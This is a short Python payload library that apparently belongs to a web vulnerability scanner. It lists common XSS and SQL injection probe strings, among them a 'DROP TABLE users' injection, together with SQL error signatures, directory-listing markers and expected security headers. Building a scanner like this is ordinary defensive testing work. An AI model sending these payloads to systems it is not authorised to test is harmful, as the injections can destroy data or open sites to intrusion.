"""
payloads.py — Payload library for vulnerability testing.

Centralises all injection strings so detectors stay clean and payloads
can be updated or extended without touching detection logic.
"""

# ---------------------------------------------------------------------------
# Cross-Site Scripting (XSS)
# ---------------------------------------------------------------------------
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "'\"><script>alert('XSS')</script>",
    "<svg onload=alert('XSS')>",
    "javascript:alert('XSS')",
]

# ---------------------------------------------------------------------------
# SQL Injection (SQLi)
# ---------------------------------------------------------------------------
SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "\" OR \"1\"=\"1",
    "1; DROP TABLE users--",
    "' UNION SELECT null, null--",
    "admin'--",
]

# Error strings that hint at a successful SQLi probe
SQLI_ERROR_SIGNATURES = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "sqlite3.operationalerror",
    "pg::syntaxerror",
    "ora-00907",
]

# ---------------------------------------------------------------------------
# Directory listing detection markers
# ---------------------------------------------------------------------------
DIR_LISTING_SIGNATURES = [
    "index of /",
    "directory listing for",
    "parent directory",
]

# ---------------------------------------------------------------------------
# Security headers that should be present
# ---------------------------------------------------------------------------
EXPECTED_SECURITY_HEADERS = [
    "Content-Security-Policy",
    "X-Content-Type-Options",
    "X-Frame-Options",
    "Strict-Transport-Security",
    "Referrer-Policy",
    "Permissions-Policy",
]
